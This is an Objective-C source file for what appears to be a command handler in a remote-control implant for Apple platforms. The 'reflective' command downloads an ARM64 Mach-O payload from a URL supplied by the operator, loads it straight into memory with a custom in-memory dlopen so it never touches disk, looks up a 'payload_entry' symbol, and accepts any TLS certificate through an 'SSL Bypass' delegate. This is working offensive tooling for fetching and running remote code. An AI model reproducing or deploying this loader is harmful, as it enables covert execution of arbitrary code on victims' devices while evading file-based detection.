#import "ZReflectiveCommandHandler.h"
#import "custom_dlfcn.h"
#import "ZAPIClient.h"
#import <mach-o/loader.h>
#import <mach-o/dyld.h>
#import <dlfcn.h>
#import <mach-o/dyld_images.h>
#import <mach/mach.h>
#import <mach/vm_map.h>
#import <mach-o/nlist.h>
#import <mach-o/dyld_priv.h>

// Forward declaration of our custom loader function
extern void* custom_dlopen_from_memory(void* mh, int len);

@interface ZReflectiveCommandHandler () <NSURLSessionDelegate>
@end

@implementation ZReflectiveCommandHandler

- (NSString *)command {
    return @"reflective";
}

- (void)executeCommand:(ZCommandModel *)command 
            completion:(void (^)(BOOL success, NSDictionary *result, NSError *error))completion {
    // Get the URL from params
    NSString *urlString = command.payload[@"url"];
    if (!urlString) {
        NSError *error = [NSError errorWithDomain:@"ZReflectiveCommandHandler" 
                                           code:100 
                                       userInfo:@{NSLocalizedDescriptionKey: @"No URL provided"}];
        completion(NO, nil, error);
        return;
    }
    
    NSLog(@"[DEBUG] Starting payload download from URL: %@", urlString);
    
    // Create URL and request
    NSURL *url = [NSURL URLWithString:urlString];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"GET"];
    
    // Create semaphore for synchronous operation
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    NSLog(@"[DEBUG] Created semaphore for synchronous operation");
    
    __block NSData *payloadData = nil;
    __block NSError *downloadError = nil;
    __block NSHTTPURLResponse *httpResponse = nil;
    
    // Use NSURLSession with SSL handling
    NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:config
                                                        delegate:self
                                                   delegateQueue:nil];
    
    NSURLSessionDataTask *task = [session dataTaskWithRequest:request
                                          completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        httpResponse = (NSHTTPURLResponse *)response;
        NSLog(@"[DEBUG] Download completed - Size: %lu, Status: %ld, Error: %@", 
              (unsigned long)data.length, 
              (long)httpResponse.statusCode,
              error);
        
        if ([response isKindOfClass:[NSHTTPURLResponse class]]) {
            NSLog(@"[DEBUG] Response Headers: %@", httpResponse.allHeaderFields);
        }
        
        payloadData = [data retain];
        downloadError = [error retain];
        dispatch_semaphore_signal(semaphore);
    }];
    [task resume];
    
    // Wait for completion
    NSLog(@"[DEBUG] Waiting for download completion");
    dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);
    dispatch_release(semaphore);
    
    if (!payloadData || downloadError || httpResponse.statusCode != 200) {
        NSLog(@"[ERROR] Download failed: %@", downloadError.localizedDescription);
        NSError *error = [NSError errorWithDomain:@"ZReflectiveCommandHandler" 
                                           code:101 
                                       userInfo:@{NSLocalizedDescriptionKey: [NSString stringWithFormat:@"Failed to download payload: %@", downloadError.localizedDescription]}];
        [payloadData release];
        [downloadError release];
        completion(NO, nil, error);
        return;
    }
    
    NSLog(@"[DEBUG] Successfully downloaded payload - Size: %lu bytes", (unsigned long)payloadData.length);
    
    // Verify MachO header
    if (payloadData.length < sizeof(struct mach_header_64)) {
        NSLog(@"[ERROR] Invalid payload size - too small for MachO header");
        NSError *error = [NSError errorWithDomain:@"ZReflectiveCommandHandler" 
                                           code:102 
                                       userInfo:@{NSLocalizedDescriptionKey: @"Invalid payload size"}];
        [payloadData release];
        completion(NO, nil, error);
        return;
    }
    
    struct mach_header_64 *header = (struct mach_header_64 *)payloadData.bytes;
    if (header->magic != MH_MAGIC_64) {
        NSLog(@"[ERROR] Invalid MachO magic number: %x", header->magic);
        NSError *error = [NSError errorWithDomain:@"ZReflectiveCommandHandler" 
                                           code:103 
                                       userInfo:@{NSLocalizedDescriptionKey: @"Invalid MachO magic number"}];
        [payloadData release];
        completion(NO, nil, error);
        return;
    }
    
    // Log detailed header information
    NSLog(@"[DEBUG] MachO Header Details:");
    NSLog(@"[DEBUG] - Magic: 0x%x", header->magic);
    NSLog(@"[DEBUG] - CPU Type: 0x%x", header->cputype);
    NSLog(@"[DEBUG] - CPU Subtype: 0x%x", header->cpusubtype);
    NSLog(@"[DEBUG] - File Type: 0x%x", header->filetype);
    NSLog(@"[DEBUG] - Number of Load Commands: %d", header->ncmds);
    NSLog(@"[DEBUG] - Size of Load Commands: %d", header->sizeofcmds);
    NSLog(@"[DEBUG] - Flags: 0x%x", header->flags);
    
    // Verify CPU type
    if (header->cputype != CPU_TYPE_ARM64) {
        NSLog(@"[ERROR] Invalid CPU type: 0x%x (expected ARM64)", header->cputype);
        NSError *error = [NSError errorWithDomain:@"ZReflectiveCommandHandler" 
                                           code:104 
                                       userInfo:@{NSLocalizedDescriptionKey: @"Invalid CPU architecture"}];
        [payloadData release];
        completion(NO, nil, error);
        return;
    }
    
    // Log load commands
    struct load_command *lc = (struct load_command *)((char *)header + sizeof(struct mach_header_64));
    for (uint32_t i = 0; i < header->ncmds; i++) {
        NSLog(@"[DEBUG] Load command %d: cmd=0x%x, size=%d", i, lc->cmd, lc->cmdsize);
        if (lc->cmd == LC_LOAD_DYLIB) {
            struct dylib_command *dylib = (struct dylib_command *)lc;
            const char *name = (char *)dylib + dylib->dylib.name.offset;
            NSLog(@"[DEBUG] - Loading dylib: %s", name);
        }
        lc = (struct load_command *)((char *)lc + lc->cmdsize);
    }
    
    // Use our custom reflective loader
    void *handle = NULL;
    @try {
        NSLog(@"[DEBUG] Attempting reflective load...");
        
        // Set up exception handler
        void (*prev_handler)(NSException *) = NSGetUncaughtExceptionHandler();
        id block = ^(NSException *exception) {
            NSLog(@"[ERROR] Uncaught exception during reflective load: %@", exception);
            NSLog(@"[ERROR] Stack trace: %@", [exception callStackSymbols]);
            if (prev_handler) prev_handler(exception);
        };
        NSSetUncaughtExceptionHandler((void (*)(NSException *))Block_copy(block));
        
        NSLog(@"[DEBUG] Calling custom_dlopen_from_memory with %lu bytes at %p", (unsigned long)payloadData.length, payloadData.bytes);
        handle = custom_dlopen_from_memory((void*)payloadData.bytes, (int)payloadData.length);
        NSLog(@"[DEBUG] custom_dlopen_from_memory returned handle: %p", handle);
        
        if (handle) {
            NSLog(@"[DEBUG] Reflective load completed - handle: %p", handle);
            
            // Try to find the entry point
            void (*entry)(void) = dlsym(handle, "payload_entry");
            if (entry) {
                NSLog(@"[DEBUG] Found entry point at %p", entry);
            } else {
                NSLog(@"[DEBUG] No entry point found (this is normal if not expected)");
            }
            
            // Log loaded image info
            uint32_t count = _dyld_image_count();
            for (uint32_t i = 0; i < count; i++) {
                const char *name = _dyld_get_image_name(i);
                const struct mach_header_64 *mh = (const struct mach_header_64 *)_dyld_get_image_header(i);
                intptr_t slide = _dyld_get_image_vmaddr_slide(i);
                if (mh && header && mh->magic == header->magic && mh->cputype == header->cputype) {
                    NSLog(@"[DEBUG] Found loaded image: %s at %p (slide: 0x%lx)", name, mh, slide);
                    break;
                }
            }
        }
        
        // Restore previous exception handler
        NSSetUncaughtExceptionHandler(prev_handler);
    } @catch (NSException *exception) {
        NSLog(@"[ERROR] Exception during reflective load: %@", exception);
        NSLog(@"[ERROR] Stack trace: %@", [exception callStackSymbols]);
        NSError *error = [NSError errorWithDomain:@"ZReflectiveCommandHandler" 
                                           code:105 
                                       userInfo:@{NSLocalizedDescriptionKey: [NSString stringWithFormat:@"Reflective load failed: %@", exception.reason]}];
        [payloadData release];
        completion(NO, nil, error);
        return;
    }
    
    if (!handle) {
        NSLog(@"[ERROR] Reflective loading failed - no handle returned");
        NSError *error = [NSError errorWithDomain:@"ZReflectiveCommandHandler" 
                                           code:106 
                                       userInfo:@{NSLocalizedDescriptionKey: @"Failed to load payload reflectively"}];
        [payloadData release];
        completion(NO, nil, error);
        return;
    }
    
    NSLog(@"[DEBUG] Successfully loaded payload reflectively at %p", handle);
    
    // Clean up
    [payloadData release];
    
    // Return success
    completion(YES, @{
        @"status": @"success",
        @"message": @"Payload loaded successfully",
        @"bytes_loaded": @(payloadData.length),
        @"load_address": [NSString stringWithFormat:@"0x%llx", (uint64_t)handle],
        @"cpu_type": @(header->cputype),
        @"file_type": @(header->filetype),
        @"flags": @(header->flags)
    }, nil);
}

- (BOOL)canCancelCommand {
    return NO;
}

- (BOOL)cancelCommand:(ZCommandModel *)command {
    return NO;
}

#pragma mark - NSURLSessionDelegate

- (void)URLSession:(NSURLSession *)session
didReceiveChallenge:(NSURLAuthenticationChallenge *)challenge
 completionHandler:(void (^)(NSURLSessionAuthChallengeDisposition disposition, NSURLCredential *credential))completionHandler {
    NSLog(@"Received authentication challenge for host: %@", challenge.protectionSpace.host);
    
    if ([challenge.protectionSpace.authenticationMethod isEqualToString:NSURLAuthenticationMethodServerTrust]) {
        NSLog(@"SSL Bypass: Accepting certificate for %@", challenge.protectionSpace.host);
        NSURLCredential *credential = [NSURLCredential credentialForTrust:challenge.protectionSpace.serverTrust];
        completionHandler(NSURLSessionAuthChallengeUseCredential, credential);
    } else {
        completionHandler(NSURLSessionAuthChallengePerformDefaultHandling, nil);
    }
}

@end 